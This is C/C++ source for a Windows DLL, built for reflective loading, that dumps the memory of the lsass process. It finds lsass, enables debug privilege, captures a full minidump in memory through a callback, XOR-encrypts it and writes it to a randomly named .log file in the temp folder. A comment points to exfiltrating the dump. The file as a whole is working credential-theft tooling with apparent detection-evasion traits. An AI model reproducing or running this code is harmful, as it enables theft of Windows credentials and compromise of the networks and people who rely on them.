#include <windows.h>
#include <DbgHelp.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <processsnapshot.h>
#include "global.h"
#include "ReflectiveLoader.h"





// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;


PVOID buffer = MHeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
DWORD bytesRead = 0;


BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

		// Gets called for each lsass process memory read operation
	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		// A chunk of minidump data that's been jus read from lsass. 
		// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
		// We will simply save it to dumpBuffer.
		source = callbackInput->Io.Buffer;

		// Calculate location of where we want to store this part of the dump.
		// Destination is start of our dumpBuffer + the offset of the minidump data
		destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput->Io.Offset);

		// Size of the chunk of minidump that's just been read.
		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}


void nt_wait(DWORD milliseconds)
{
	static NTSTATUS(__stdcall * NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER)) GetProcAddress(GetModuleHandleA(("ntdll.dll")), ("NtDelayExecution"));
	static NTSTATUS(__stdcall * ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG)) GetProcAddress(GetModuleHandleA(("ntdll.dll")), ("ZwSetTimerResolution"));
	static bool once = true;
	if (once && ZwSetTimerResolution != NULL) {
		ULONG actualResolution;
		ZwSetTimerResolution(1, true, &actualResolution);
		once = false;
	}
	LARGE_INTEGER interval;
	interval.QuadPart = -1 * (int)(milliseconds * 10000);
	if (NtDelayExecution != NULL)
	{
		NtDelayExecution(false, &interval);
	}

}

void GenRandomStringW(LPWSTR lpFileName, INT len) {
	static const wchar_t AlphaNum[] =
		L"0123456789"
		L"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		L"abcdefghijklmnopqrstuvwxyz";
	srand(GetTickCount());
	for (INT i = 0; i < len; ++i) {
		lpFileName[i] = AlphaNum[rand() % (_countof(AlphaNum) - 1)];
	}
	lpFileName[len] = 0;
}

void nt_callback(char* xorkey)
{
	nt_wait(10000);
	DWORD PID = 0;
	DWORD bytesWritten = 0;
	HANDLE lHandle = NULL;
	HANDLE snapshot = MCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	ULONG  t;

	// Get lsass PID
	if (MProcess32FirstW(snapshot, &processEntry)) {
		while (_wcsicmp(processName, L"lsass.exe") != 0) {
			MProcess32NextW(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			PID = processEntry.th32ProcessID;
		}
	}

	// enable debug privilege
	MRtlAdjustPrivilege(20, TRUE, FALSE, &t);

	lHandle = MOpenProcess(PROCESS_ALL_ACCESS, 0, PID);

	// Set up minidump callback
	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	callbackInfo.CallbackRoutine = &minidumpCallback;
	callbackInfo.CallbackParam = NULL;

	// Dump lsass
	BOOL isD = MMiniDumpWriteDump(lHandle, PID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);

	if (isD)
	{
		long int size = bytesRead;
		char* securitySth = new char[size];

		memcpy(securitySth, buffer, bytesRead);
		securitySth = Xorcrypt(securitySth, bytesRead, xorkey);

		WCHAR logTempPath[MAX_PATH];
		DWORD  dwRetVal = GetTempPath(MAX_PATH, logTempPath);
		if (dwRetVal == 0) {
			wprintf(L"[-] Get temp path failure! \n");
			wprintf(L"[+] Set the target directory to C:\\ProgramData\\ \n");
			lstrcpy(logTempPath, L"C:\\ProgramData\\");
		}

		WCHAR logFileName[MAX_PATH] = { 0 };
		GenRandomStringW(logFileName, 12);
		lstrcat(logTempPath, logFileName);
		lstrcat(logTempPath, L".log");
		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
		HANDLE outFile = CreateFile(logTempPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (WriteFile(outFile, securitySth, bytesRead, &bytesWritten, NULL))
		{
			printf("[+] file xor crypt key: %s\n", xorkey);
			wprintf(L"[+] save to %ls\n", logTempPath);
		}
		else
		{
			wprintf(L"[-] File can't write,  dump  failed! \n");
		}
		CloseHandle(outFile);
	}
	else
	{
		wprintf(L"[-] callbackdump failed! Maybe the target has RunAsPPL turned on \n");
	}
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	char* key = (char*)"fuck";

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		
		if (lpReserved != NULL && strlen((char*)lpReserved) > 0) {
			 key= (char*)lpReserved;
		}
		nt_callback(key);
		fflush(stdout);
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
